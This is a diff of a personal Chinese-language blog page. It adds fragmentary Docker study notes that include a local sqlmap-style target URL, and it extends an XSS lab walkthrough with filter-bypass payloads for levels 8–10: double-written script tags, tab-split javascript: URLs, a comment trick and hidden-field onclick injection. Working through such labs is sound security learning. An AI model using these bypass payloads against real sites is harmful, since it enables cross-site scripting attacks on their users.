@@ -84,6 +84,59 @@ ga('send', 'pageview');
       <div class="outer">
         <section id="main">
   
+    <article id="post-Docker学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/16/Docker学习笔记/" class="article-date">
+  <time datetime="2019-03-15T19:36:58.000Z" itemprop="datePublished">2019-03-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/16/Docker学习笔记/">Docker学习笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>sudo add-apt-repository \<br>   “deb [arch=amd64] <a href="https://download.docker.com/linux/ubuntu" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu</a> \<br>   $(lsb_release -cs) \<br>   stable”</p>
+<p><a href="https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/</a></p>
+<p>配置完镜像源后，记得重启</p>
+<p>/bin/sh<br>/bin/bash<br>运行shell</p>
+<p>docker run –name mysql-data -p 3306:3306 -v /home/finsenty/Documents/mysqldata:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=”123456” -d mysql:5.7</p>
+<p>docker run -p 8888:5000 –name myfirstapp YOUR_USERNAME/myfirstapp</p>
+<ul>
+<li>Running on <a href="http://0.0.0.0:5000/" target="_blank" rel="noopener">http://0.0.0.0:5000/</a> (Press CTRL+C to quit)</li>
+</ul>
+<p> docker rm <code>docker ps -a -q</code></p>
+<p> docker rmi <code>docker images -q</code></p>
+<p> docker run -p 4000:80 –name py-http6 –link mariadb:mysql finsenty/http5</p>
+<p> mysql.connecter 查询后面带一个，</p>
+<p> -u “<a href="http://192.168.160.1/sqltest/post.php&quot;" target="_blank" rel="noopener">http://192.168.160.1/sqltest/post.php&quot;</a> –forms</p>
+
+      
+    </div>
+    <footer class="article-footer">
+    <span id="busuanzi_container_page_pv">
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	</span>
+      <a data-url="http://finsenty54.github.io/2019/03/16/Docker学习笔记/" data-id="cjtr210lw00020ww8qvp0m1wi" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-xss" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/03/02/xss/" class="article-date">
@@ -127,14 +180,20 @@ ga('send', 'pageview');
 <h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><code>script</code>被过滤，改变大小写也没有用<br><code>on</code>被过滤<br><code>href</code>同样如此<br><code>keyword=&quot;&gt;&lt;scriscriptpt&gt;alert()&lt;/scrscriptipt&gt;&lt;&quot;</code><br>利用双写绕过</p>
 <p>更新于2019-03-06 21:20:39 星期三</p>
 <hr>
-
+<h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p>这题可以添加链接<br>直接使用<code>javascript:alert(1)</code><br>但并没有用，查看源码<code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code>被替换了<br>使用制表符绕过<code>%09</code><br><code>keyword=javasc%09ript%3Aalert%281%29&amp;submit=添加友情链接</code></p>
+<hr>
+<h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>上题结果没有用，查看源码<code>if(false===strpos($str7,&#39;http://&#39;))</code><br>知一定要有<code>http://</code><br>在javascript伪协议里面，属于js范畴，所以单行注释符是可以使用的<br><code>javasc%09ript%3Aalert%281%29//http://www.test.com</code></p>
+<hr>
+<h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><p>查看页面元素<br><a href="https://imgchr.com/i/AdFKeI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/27/AdFKeI.th.png" alt="AdFKeI.th.png"></a><br>有几个隐藏的值，注入点就在这<br><code>keyword=test&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()</code><br><a href="https://imgchr.com/i/AdkZNV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/27/AdkZNV.th.png" alt="AdkZNV.th.png"></a></p>
+<hr>
+<h2 id="更新于2019-03-27-18-15-42-星期三"><a href="#更新于2019-03-27-18-15-42-星期三" class="headerlink" title="更新于2019-03-27 18:15:42 星期三"></a>更新于2019-03-27 18:15:42 星期三</h2>
       
     </div>
     <footer class="article-footer">
     <span id="busuanzi_container_page_pv">
   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
 	</span>
-      <a data-url="http://finsenty54.github.io/2019/03/02/xss/" data-id="cjt76kw3c0001xkw8mnx90dfg" class="article-share-link">Share</a>
+      <a data-url="http://finsenty54.github.io/2019/03/02/xss/" data-id="cjtr210lq00010ww8vq1rzqf0" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>
@@ -318,7 +377,7 @@ POST - 向指定的资源提交要被处理的数据
     <span id="busuanzi_container_page_pv">
   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
 	</span>
-      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjt76kw3z0004xkw8q2fv6b5o" class="article-share-link">Share</a>
+      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjtr210mf00050ww8uecucqmd" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li></ul>
@@ -353,7 +412,7 @@ POST - 向指定的资源提交要被处理的数据
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -364,6 +423,10 @@ POST - 向指定的资源提交要被处理的数据
     <h3 class="widget-title">最新文章</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2019/03/16/Docker学习笔记/">Docker学习笔记</a>
+          </li>
         
           <li>
             <a href="/2019/03/02/xss/">XSS 20关挑战</a>
